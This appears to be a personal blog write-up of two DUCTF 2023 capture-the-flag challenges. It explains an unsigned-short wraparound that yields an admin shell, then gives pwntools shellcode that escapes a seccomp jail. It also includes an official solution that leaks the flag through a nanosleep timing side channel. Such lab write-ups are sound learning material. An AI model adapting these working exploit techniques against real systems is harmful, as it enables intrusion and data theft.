---
title: "DUCTF23"
date: 2023-09-08T16:56:10+10:00
draft: false
toc: false
Summary: "DUCTF23 a few challenges"
images:
tags:
  - pwn
  - ductf
---

### Overflow Downunder

This was a fun challenge where we had to find out how to log into the system.

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define USERNAME_LEN 6
#define NUM_USERS 8
char logins[NUM_USERS][USERNAME_LEN] = { "user0", "user1", "user2", "user3", "user4", "user5", "user6", "admin" };

void init() {
    setvbuf(stdout, 0, 2, 0);
    setvbuf(stdin, 0, 2, 0);
}

int read_int_lower_than(int bound) {
    int x;
    scanf("%d", &x);
    if(x >= bound) {
        puts("Invalid input!");
        exit(1);
    }
    return x;
}

int main() {
    init();

    printf("Select user to log in as: ");
    unsigned short idx = read_int_lower_than(NUM_USERS - 1);

    printf("Logging in as %s\n", logins[idx]);
    if(strncmp(logins[idx], "admin", 5) == 0) {
        puts("Welcome admin.");
        system("/bin/sh");
    } else {
        system("/bin/date");
    }-
}

```
So we have to enter a index that we log us in as the admin, however we are limited to a bound of `NUM_USERS - 1`. Interestingly `read_int_lower_than` returns an int. But when called is cast to an unsigned short. Which can hold values of 0 to 65,535. We have to find a number that wraps around to 8 and is less than 7. With a little trial and error I found a number.

![checksec](/images/DUCTF23/downunderflow.png)



### Jail
This was a great challenge that I spent most of my time trying to solve. I was not able to get the flag but I did learn a lot.

seccomp is a tool that limits what system calls an application can make. We can see it initalized in the jail.
``` c
void enable_jail(void)

{
  undefined8 uVar1;
  
  uVar1 = seccomp_init(0);
  seccomp_rule_add(uVar1,0x7fff0000,0,0);
  seccomp_rule_add(uVar1,0x7fff0000,0x101,0);
  seccomp_rule_add(uVar1,0x7fff0000,0x23,0);
  seccomp_rule_add(uVar1,0x7fff0000,0x3c,0);
  seccomp_load(uVar1);
  return;
}

```

We care about the middle two values of each rule added `0x7fff0000` which means we are allowed to use the following syscall. A good reference of syscalls can be found here.

https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md#x86_64-64_bit

We are allowed to call read, nanosleep, exit and open. So we know we are allowed syscall's so lets have a look at main.

``` c
bool main(void)

{
  code *__s;
  
  setvbuf(stdout,(char *)0x0,2,0);
  setvbuf(stdin,(char *)0x0,2,0);
  __s = (code *)mmap((void *)0x0,0x80,7,0x22,0,0);
  if (__s != (code *)0x0) {
    printf("what is your escape plan?\n > ");
    fgets((char *)__s,0x7f,stdin);
    enable_jail();
    (*__s)();
  }
  return __s == (code *)0x0;
}

```

We are asked for an escape plan and the stack is executable so its time to write some shell code.

![checksec](/images/DUCTF23/checksec.png)

We are told for this challenge that the flag is located in /chal/flag.txt so I made one locally with the contents `DUCTF{helloworld}`. The first steps was to write to shellcode to open and read the file.

``` python
#DUCTF2023 the great escape 
from pwn import *
from pwnlib.util.packing import p64
elf=context.binary=ELF('./jail')
# p=process('./jail')

io = gdb.debug('./jail', '''
    continue
''')

io.readuntil('plan?\n')


def build_shellcode(offset=0):
    #payload will be a syscall to read the file
    FLAG_LEN = 0x8
    shellcode = asm(shellcraft.openat(-2,'/chal/flag.txt', oflag=0))
    shellcode += asm(shellcraft.amd64.linux.read(fd='rax', buffer='rsp', count=FLAG_LEN))
```

Entering that we can see that our flag is in memory.

![in memory](/images/DUCTF23/in_mem.png)

Now how to get it out? After doing some reading and watching a video from pwn college. I found out that we could use the exit code to pass out a byte of information.

https://www.youtube.com/watch?v=hrT1xvxGKS4

I was able to get an exit code 85 in this screenshot where I wanted to get out the second letter which is an ascii `U` the second letter of our flag. It worked by adding this additional shell code.

```
    #exit with a byte from RSP
    shellcode+= asm('''

        push 0x3c
        pop rax
        push [rsp + 1]
        pop rdi
        syscall
    ''')
```

![right exit code](/images/DUCTF23/ascii_out.png)

I tried my payload on the remote machine but was not able to see the exit code of the child process. I tried scratching my head for a little longer but ran out of time. After the CTF was over they released solutions, I was on the right track using a side channel attack but was using the wrong method. Lets have a deeper look.

``` python
#!/usr/bin/env python3

import math
import time
from pwn import *

context.arch = 'amd64'


def generate_shellcode(i):
    shellcode = shellcraft.openat(-1, '/chal/flag.txt')
    shellcode += shellcraft.read('rax', 'rsp', 64)

    if i == 0xa:
        shellcode += f'''
        mov rdx, 9
        inc rdx
        '''
    else:
        shellcode += f'''
        mov rdx, {i}
        '''
    shellcode += '''
    mov al, byte [rsp + rdx]
    '''

    # struct timespec {
    #   .tv_sec  = byte [rsp + i] / 10
    #   .tv_nsec = (byte [rsp + i] % 10) * 100000000
    # }
    shellcode += '''
    mov rbx, 9; inc rbx
    xor rdx, rdx
    div rbx
    mov rbx, rax
    mov rax, 100000000
    mul rdx
    push rax
    push rbx
    '''

    shellcode += shellcraft.nanosleep('rsp', 0)
    shellcode += shellcraft.exit(0)

    return shellcode


def get_char_at(i):
    shellcode = generate_shellcode(i)

    # r = remote('localhost', 1337)
    elf=context.binary=ELF('./jail')
    # p=process('./jail')
    r = process('./jail')
    r.readuntil(b'> ')

    start_time = time.time()
    r.writeline(asm(shellcode))
    r.readall()

    time_taken = time.time() - start_time 
    r.close()

    log.info(f'time_taken = {time_taken}s')
    result = chr(math.floor(time_taken * 10))
    log.info(f'flag[{i}] = "{result}"')

    return result


flag = ''.join([get_char_at(i) for i in range(44)])
log.success(f'flag = "{flag}"')
```

Instead of an exit code they use a nanosleep and time how long the application runs for. What was cool to me is how they push the data in the struct onto the stack and pass the stack pointer register.